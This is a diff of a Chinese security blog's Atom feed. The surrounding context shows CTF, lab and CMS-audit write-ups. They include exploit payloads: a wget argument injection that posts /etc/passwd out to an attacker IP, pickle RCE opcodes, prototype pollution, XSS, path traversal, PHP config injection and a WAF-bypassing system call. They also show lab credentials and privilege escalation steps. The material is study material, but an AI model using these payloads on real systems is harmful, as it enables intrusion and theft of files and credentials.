+&lt;p&gt;&lt;a href=&#34;https://cloud.tencent.com/developer/article/1750796&#34;&gt;https://cloud.tencent.com/developer/article/1750796&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://tttang.com/archive/1353/&#34;&gt;https://tttang.com/archive/1353/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/10648&#34;&gt;https://xz.aliyun.com/t/10648&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/7789&#34;&gt;https://xz.aliyun.com/t/7789&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://kiprey.github.io/2020/12/CodeQL-setup/&#34;&gt;https://kiprey.github.io/2020/12/CodeQL-setup/&lt;/a&gt;&lt;/p&gt;
+</content>
+            
+            
+            
+            
+            
+                
+                    
+                        
+                            
+                            
+                            
+                                <category scheme="https://tyskill.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" term="学习笔记" label="学习笔记" />
+                            
+                        
+                    
+                
+                    
+                        
+                            
+                            
+                            
+                                <category scheme="https://tyskill.github.io/tags/codeql/" term="CodeQL" label="CodeQL" />
+                            
+                        
+                            
+                            
+                            
+                                <category scheme="https://tyskill.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" term="代码审计" label="代码审计" />
+                            
+                        
+                    
+                
+            
+        </entry>
+    
         <entry>
             <title type="text">Java cc链-TemplatesImpl利用分析</title>
             <link rel="alternate" type="text/html" href="https://tyskill.github.io/posts/javatemplatesimpl/" />
@@ -580,7 +978,7 @@
                             
                             
                             
-                                <category scheme="https://tyskill.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" term="漏洞复现" label="漏洞复现" />
+                                <category scheme="https://tyskill.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" term="代码审计" label="代码审计" />
                             
                         
                     
@@ -663,15 +1061,15 @@
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;action&amp;#34;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
-      &lt;span class=&#34;err&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;图标icon&lt;/span&gt;
-      &lt;span class=&#34;nt&#34;&gt;&amp;#34;default_icon&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+      &lt;span class=&#34;c1&#34;&gt;// 图标icon
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;#34;default_icon&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
         &lt;span class=&#34;nt&#34;&gt;&amp;#34;16&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;img/icon_16.png&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
         &lt;span class=&#34;nt&#34;&gt;&amp;#34;32&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;img/icon_32.png&amp;#34;&lt;/span&gt;
       &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;
-      &lt;span class=&#34;err&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;鼠标悬停时标题&lt;/span&gt;
-      &lt;span class=&#34;nt&#34;&gt;&amp;#34;default_title&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;tyskill&amp;#39;s tools&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
-      &lt;span class=&#34;err&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;小窗口html页面&lt;/span&gt;
-      &lt;span class=&#34;nt&#34;&gt;&amp;#34;default_popup&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;popup.html&amp;#34;&lt;/span&gt;
+      &lt;span class=&#34;c1&#34;&gt;// 鼠标悬停时标题
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;#34;default_title&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;tyskill&amp;#39;s tools&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+      &lt;span class=&#34;c1&#34;&gt;// 小窗口html页面
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;#34;default_popup&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;popup.html&amp;#34;&lt;/span&gt;
   &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
@@ -766,7 +1164,7 @@
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;然后会在指定域生成权限申请&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210828184058.png&#34; style=&#34;zoom:80%;&#34; /&gt;&lt;/p&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210828184058.png&#34; style=&#34;zoom:80%;&#34; /&gt;
 &lt;p&gt;此外还有一些比较有趣的配置项：如&lt;a href=&#34;https://developer.chrome.com/docs/extensions/mv3/content_scripts/&#34;&gt;content_scripts&lt;/a&gt;可以修改DOM、&lt;a href=&#34;https://developer.chrome.com/docs/extensions/mv3/manifest/sandbox/&#34;&gt;content_security_policy&lt;/a&gt;设置sandbox page的安全策略，其他的看官方文档就行了&lt;/p&gt;
 &lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
 &lt;p&gt;&lt;a href=&#34;https://developer.chrome.com/docs/extensions/&#34;&gt;https://developer.chrome.com/docs/extensions/&lt;/a&gt;&lt;/p&gt;
@@ -2424,7 +2822,7 @@
                             
                             
                             
-                                <category scheme="https://tyskill.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" term="漏洞复现" label="漏洞复现" />
+                                <category scheme="https://tyskill.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" term="代码审计" label="代码审计" />
                             
                         
                     
@@ -2466,7 +2864,7 @@
 &lt;h2 id=&#34;分析过程&#34;&gt;分析过程&lt;/h2&gt;
 &lt;p&gt;&lt;strong&gt;环境&lt;/strong&gt;：Java1.8&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Gadget Chain&lt;/strong&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;HashMap.readObject()
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;HashMap.readObject()
 	HashMap.putVal()
 		HashMap.hash()
 			URL.hashCode()
@@ -3133,7 +3531,7 @@
 &lt;p&gt;由于package.json的版本声明以&lt;code&gt;^&lt;/code&gt;开头，所以在npm install时会自动更新小版本，因此会导致lodash更新到没有该漏洞的版本，需要将lodash的&lt;code&gt;^&lt;/code&gt;删掉指定版本下载&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;然后就可以得到payload&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;username=tyskill&amp;amp;password=tyskill&amp;amp;&amp;quot;].__proto__[&amp;quot;isadmin=tyskill&amp;amp;&amp;quot;].__proto__[&amp;quot;debug=tyskill
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;username=tyskill&amp;amp;password=tyskill&amp;amp;&amp;quot;].__proto__[&amp;quot;isadmin=tyskill&amp;amp;&amp;quot;].__proto__[&amp;quot;debug=tyskill
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功污染session的isadmin和debug之后就是之前的一个漏洞&lt;a href=&#34;https://github.com/pugjs/pug/issues/3312&#34;&gt;https://github.com/pugjs/pug/issues/3312&lt;/a&gt;，这也是为什么源码定义了pretty属性但没有使用的原因吧&lt;/p&gt;
 &lt;p&gt;exp&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -3223,9 +3621,9 @@
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;输入有两个，wget参数和图片地址，图片地址没办法目录穿越，只能依靠wget参数作为入口点，通过代理获得文件流数据&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;/images?image=&amp;amp;argv=--post-file=/etc/passwd&amp;amp;argv=--execute=http_proxy=http://IP
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/images?image=&amp;amp;argv=--post-file=/etc/passwd&amp;amp;argv=--execute=http_proxy=http://IP
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后就可以得到一些文件，接下来就是审计工作，看名字也知道是pickle反序列化，直接上&lt;a href=&#34;https://github.com/EddieIvan01/pker&#34;&gt;pker&lt;/a&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;s=GLOBAL(&amp;quot;config&amp;quot;,&amp;quot;notadmin&amp;quot;)
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;s=GLOBAL(&amp;quot;config&amp;quot;,&amp;quot;notadmin&amp;quot;)
 s[&amp;quot;admin&amp;quot;]=&amp;quot;yes&amp;quot;
 user=INST(&amp;quot;config&amp;quot;,&amp;quot;user&amp;quot;)
 user.username=&amp;quot;tyskill&amp;quot;
@@ -3362,7 +3760,7 @@ return user
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;通过审计代码可以发现它定义了一个反序列化的模块限制，但是限制函数并没有使用，所以它定义了个寂寞。因此整个代码仅有的过滤就是&lt;code&gt;R&lt;/code&gt;字符，参考&lt;a href=&#34;https://eustiar.com/archives/673&#34;&gt;https://eustiar.com/archives/673&lt;/a&gt;可以知道在无&lt;code&gt;R&lt;/code&gt;下的RCE姿势：（还记了一种覆盖式的RCE这里不讨论，用不上）&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;\x80\x03(S&#39;ls&#39;\nios\nsystem\n.
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;\x80\x03(S&#39;ls&#39;\nios\nsystem\n.
 \x80\x03(cos\nsystem\nS&#39;whoami&#39;\no.
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里不要盲目的使用payload，因为它pickle反序列化使用的是0号协议，该协议有什么特点呢？自己本地dumps一遍就知道了，然后就可以发现文章给的payload是3号协议的，所以我们需要修改，直接把&lt;code&gt;\x80\x03&lt;/code&gt;删了就行。接下来就是payload一把梭了（不像what_pickle没给curl，这道题真TM友好）&lt;/p&gt;
 &lt;p&gt;exp&lt;/p&gt;
@@ -3588,11 +3986,11 @@ return user
 &lt;/div&gt;
 &lt;/div&gt;&lt;h3 id=&#34;xss&#34;&gt;XSS&lt;/h3&gt;
 &lt;p&gt;借助Go模板提供的字符串打印功能，可以直接输出XSS语句，上面修改的的防御方法也无法阻挡弹窗的脚步&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;{{&amp;quot;&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;&amp;quot;}}
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{{&amp;quot;&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;&amp;quot;}}
 {{print &amp;quot;&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;&amp;quot;}}
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;防御方法&lt;/strong&gt;：&lt;/p&gt;
 &lt;p&gt;1、Go模板包&lt;code&gt;text/template&lt;/code&gt;提供了内置函数html来转义特殊字符，除此之外还提供了js函数转义js代码。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;{{html &amp;quot;&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;&amp;quot;}}
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{{html &amp;quot;&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;&amp;quot;}}
 {{js &amp;quot;js代码&amp;quot;}}
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2、&lt;code&gt;text/template&lt;/code&gt;在模板处理阶段还定义&lt;code&gt;template.HTMLEscapeString&lt;/code&gt;等转义函数&lt;/p&gt;
 &lt;p&gt;3、使用另一个模板包&lt;code&gt;html/template&lt;/code&gt;，自带转义效果&lt;/p&gt;
@@ -3688,7 +4086,7 @@ return user
                 <content type="html">&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
 &lt;p&gt;第一次线下被打成💩了，比赛中一直被打，修洞的过程也是磕磕碰碰。想着之后要增加一下cms的审计经验，但是摸了一学期又陷入期末复习的深渊，没法子，审计学习咕到了现在。。。现在终于有了时间，在寻找目标的时候恰好看到一个极简风格的cms——&lt;a href=&#34;https://github.com/bg5sbk/MiniCMS&#34;&gt;MiniCMS&lt;/a&gt;，应该很适合我这个菜鸡（嘿嘿嘿）。&lt;/p&gt;
 &lt;h2 id=&#34;目录结构&#34;&gt;目录结构&lt;/h2&gt;
-&lt;pre&gt;&lt;code&gt;mc-admin           后台
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mc-admin           后台
   |--...           后台功能及前端面板
 mc-files           文章或页面内容处理
   |--theme         渲染文章
@@ -3831,7 +4229,7 @@ mc-files           文章或页面内容处理
 &lt;/div&gt;&lt;h3 id=&#34;mc-adminpostphp&#34;&gt;mc-admin/post.php&lt;/h3&gt;
 &lt;p&gt;分类显示的tag和data同样也是无处理直接输出。&lt;/p&gt;
 &lt;p&gt;payload&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;post.php?state=publish&amp;amp;tag=&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(&#39;tag&#39;)&amp;lt;/script&amp;gt;&amp;amp;date=&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(&#39;date&#39;)&amp;lt;/script&amp;gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;post.php?state=publish&amp;amp;tag=&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(&#39;tag&#39;)&amp;lt;/script&amp;gt;&amp;amp;date=&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(&#39;date&#39;)&amp;lt;/script&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;修复-2&#34;&gt;修复&lt;/h4&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -3862,7 +4260,7 @@ mc-files           文章或页面内容处理
 &lt;h2 id=&#34;信息泄露&#34;&gt;信息泄露&lt;/h2&gt;
 &lt;h3 id=&#34;mc-adminpost-editphp-1&#34;&gt;mc-admin/post-edit.php&lt;/h3&gt;
 &lt;p&gt;编辑文章的URL中id存在目录穿越，但是由于代码中进行了后缀拼接所以不会导致任意文件读取（在00截断还存在的php版本中可以成功&lt;a href=&#34;https://github.com/bg5sbk/MiniCMS/issues/39&#34;&gt;任意文件读&lt;/a&gt;），但是错误信息会暴露项目的绝对路径。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;post-edit.php?id=../../../../../../../etc/passwd
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;post-edit.php?id=../../../../../../../etc/passwd
 &lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;修复-3&#34;&gt;修复&lt;/h4&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -3887,7 +4285,7 @@ mc-files           文章或页面内容处理
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;下个断点看一下code值&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;&#39;&amp;lt;?php
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&#39;&amp;lt;?php
 $mc_config = array (
   \&#39;version\&#39; =&amp;gt; \&#39;1.10\&#39;,
   \&#39;site_link\&#39; =&amp;gt; \&#39;http://IP/mini/\&#39;,
@@ -3901,7 +4299,7 @@ $mc_config = array (
 ?&amp;gt;&#39;
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;存在单引号闭合，所以可以在安装过程中提前插入单引号闭合执行代码&lt;/p&gt;
 &lt;p&gt;payload&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;hhh&#39;,);phpinfo();//
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;hhh&#39;,);phpinfo();//
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;但是由于install.php在安装完会自我删除，所以这个利用不大，除非有个文件包含能包含根目录下的install.txt&lt;/p&gt;
 &lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
 &lt;p&gt;&lt;a href=&#34;https://github.com/AvaterXXX/MiniCms/blob/master/Command%20Execution.md&#34;&gt;https://github.com/AvaterXXX/MiniCms/blob/master/Command%20Execution.md&lt;/a&gt;&lt;/p&gt;
@@ -3917,7 +4315,7 @@ $mc_config = array (
                             
                             
                             
-                                <category scheme="https://tyskill.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" term="漏洞复现" label="漏洞复现" />
+                                <category scheme="https://tyskill.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" term="代码审计" label="代码审计" />
                             
                         
                     
@@ -3954,7 +4352,7 @@ $mc_config = array (
 &lt;/blockquote&gt;
 &lt;p&gt;Cao了，这道题连方向都错了，嘤嘤嘤好菜啊😭。。。&lt;/p&gt;
 &lt;p&gt;随便传一个&lt;code&gt;print(&amp;quot;Hello World!&amp;quot;)&lt;/code&gt;执行返回&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;[-] Are you fucking kidding me? I don&#39;t know anything other than print and # !
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[-] Are you fucking kidding me? I don&#39;t know anything other than print and # !
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;触发了WAF，也就是只能靠&lt;code&gt;print&lt;/code&gt;和&lt;code&gt;#&lt;/code&gt;，且不能在同一行，具体还是没啥思路，就fuzz一下，发现print内部只能使用大小写字母，#倒可以为所欲为。没思路，然后我就开始找php除了命令行执行python文件，是不是有什么特别的模块漏洞，一入脑洞深似海。。。&lt;/p&gt;
 &lt;p&gt;有一个解是通过python声明编码方式&lt;code&gt;raw_unicode_escape&lt;/code&gt;从而实现Unicode解析字符逃逸危险代码，接下来就来试图理解一下大佬的思路：&lt;/p&gt;
 &lt;p&gt;python常用的header声明有解释器声明和编码声明，如下所示：&lt;/p&gt;
@@ -4001,7 +4399,7 @@ $mc_config = array (
 &lt;/blockquote&gt;
 &lt;h3 id=&#34;解题过程&#34;&gt;解题过程&lt;/h3&gt;
 &lt;p&gt;既然是mysql8，那肯定要用到Table语句了，fuzz一下发现&lt;code&gt;\&lt;/code&gt;或&lt;code&gt;&#39;&lt;/code&gt;时回显报错信息&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;123&#39;&#39; at line 1
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;123&#39;&#39; at line 1
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;被ban字符&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210714220312.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;接下来注入，参考&lt;a href=&#34;https://www.anquanke.com/post/id/231627&#34;&gt;浅谈利用mysql8新特性进行SQL注入&lt;/a&gt;修改脚本注入即可（不会用脚本，是我太菜了。。。）&lt;/p&gt;
@@ -4352,7 +4750,7 @@ $mc_config = array (
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;结果&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;PORT   STATE SERVICE VERSION
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
 | ssh-hostkey: 
 |   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 (RSA)
@@ -4377,7 +4775,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 &lt;/div&gt;&lt;p&gt;结果&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210605210018.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;note.txt&lt;/code&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;Hello developers!!
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Hello developers!!
 
 
 I will be using our new HTTP3 Server at https://quic.nagini.hogwarts for further communications.
@@ -4400,7 +4798,7 @@ site_amdin
 &lt;/blockquote&gt;
 &lt;p&gt;扫joomla的过程中可以看看先扫出来的note.txt，需要使用HTTP3访问&lt;code&gt;https://quic.nagini.hogwarts&lt;/code&gt;，在hosts中添置一下，吐了，quiche装不上。。。快进到成功访问获得文件&lt;code&gt;internalResourceFeTcher.php&lt;/code&gt;和上面已经扫到的&lt;code&gt;configuration.php.bak&lt;/code&gt;。internalResourceFeTcher.php存在SSRF，可以通过file任意文件读，公钥没读到，想起来备份文件中有日志文件地址，读一下试试，还是啥都读不到emmm&lt;/p&gt;
 &lt;p&gt;回去重新看备份文件，发现有数据库配置&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;public $host = &#39;localhost&#39;;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;public $host = &#39;localhost&#39;;
 public $user = &#39;goblin&#39;;
 public $password = &#39;&#39;;
 public $db = &#39;joomla&#39;;
@@ -4419,7 +4817,7 @@ public $dbprefix = &#39;joomla_&#39;;
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;获得管理员信息&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;site_admin site_admin@nagini.hogwarts $2y$10$cmQ.akn2au104AhR4.YJBOC5W13gyV21D/bkoTmbWWqFWjzEW7vay
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;site_admin site_admin@nagini.hogwarts $2y$10$cmQ.akn2au104AhR4.YJBOC5W13gyV21D/bkoTmbWWqFWjzEW7vay
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;密码爆破不出来，只能通过修改密码来登陆了&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -4436,7 +4834,7 @@ public $dbprefix = &#39;joomla_&#39;;
 &lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210605231036.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;h3 id=&#34;提权&#34;&gt;提权&lt;/h3&gt;
 &lt;p&gt;翻文件，在web目录下找到第一个flag文件horcrux1.txt&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;horcrux_{MzogU2x5dGhFcmlOJ3MgTG9jS0VldCBkRXN0cm9ZZUQgYlkgUm9O}
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;horcrux_{MzogU2x5dGhFcmlOJ3MgTG9jS0VldCBkRXN0cm9ZZUQgYlkgUm9O}
 # horcrux_{3: SlythEriN&#39;s LocKEet dEstroYeD bY RoN}
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接着翻，home目录下发现两个用户，hermoine用户下有一个suid文件&lt;code&gt;su_cp&lt;/code&gt;和无读权限的horcrux2.txt，暂时用不到，另一个用户snape目录下有挺多东西，在&lt;code&gt;.creds.txt&lt;/code&gt;读到TG92ZUBsaWxseQ==，解码结果Love@lilly，直接ssh登录。&lt;/p&gt;
 &lt;p&gt;有了正经用户，接下来就尝试提权，执行&lt;code&gt;sudo -l&lt;/code&gt;发现没有sudo指令，结合之前hermoine目录下的可执行文件&lt;code&gt;su_cp&lt;/code&gt;，顾名思义，可能是执行&lt;code&gt;sudo cp&lt;/code&gt;，猜测这个可能要用来提权，为了保险再找一下suid文件&lt;/p&gt;
@@ -4465,7 +4863,7 @@ ssh hermoine@192.168.150.136 &lt;span class=&#34;c1&#34;&gt;# ssh连接&lt;/span
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;读取horcrux2.txt&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;horcrux_{NDogSGVsZ2EgSHVmZmxlcHVmZidzIEN1cCBkZXN0cm95ZWQgYnkgSGVybWlvbmU=}
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;horcrux_{NDogSGVsZ2EgSHVmZmxlcHVmZidzIEN1cCBkZXN0cm95ZWQgYnkgSGVybWlvbmU=}
 # horcrux_{4: Helga Hufflepuff&#39;s Cup destroyed by Hermione}
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;后面就是浏览器取证，使用工具&lt;a href=&#34;https://github.com/unode/firefox_decrypt&#34;&gt;firefox_decrypt&lt;/a&gt;获得root密码：&lt;code&gt;@Alohomora#123&lt;/code&gt;，su登录root获得flag3&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210606000111.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
@@ -4784,7 +5182,7 @@ ssh hermoine@192.168.150.136 &lt;span class=&#34;c1&#34;&gt;# ssh连接&lt;/span
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;生成的payload传入反序列化点，bp爆破，然后再开一个访问&lt;code&gt;hack.php&lt;/code&gt;的任务，把线程调整到10~20即可&lt;/p&gt;
 &lt;p&gt;接着就可以看到phpinfo了&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# disable_functions
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# disable_functions
 pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;很明显这里ban的都是什么用不到的函数，所以system在没有特别标注waf的情况下可以使用。后面就是寻找RCE，看着就觉得waf很麻烦，导致卡了很久，后来想到动态调用函数就去找可以绕waf的编码（system支持动态调用），结果编码没找到，找到了字符串倒序函数&lt;code&gt;strrev&lt;/code&gt;，最后payload&lt;code&gt;strrev(&#39;metsys&#39;)(&#39;cat /*&#39;);&lt;/code&gt;条件竞争读flag&lt;/p&gt;
 </content>
@@ -4862,7 +5260,7 @@ Database: security
 &lt;/div&gt;
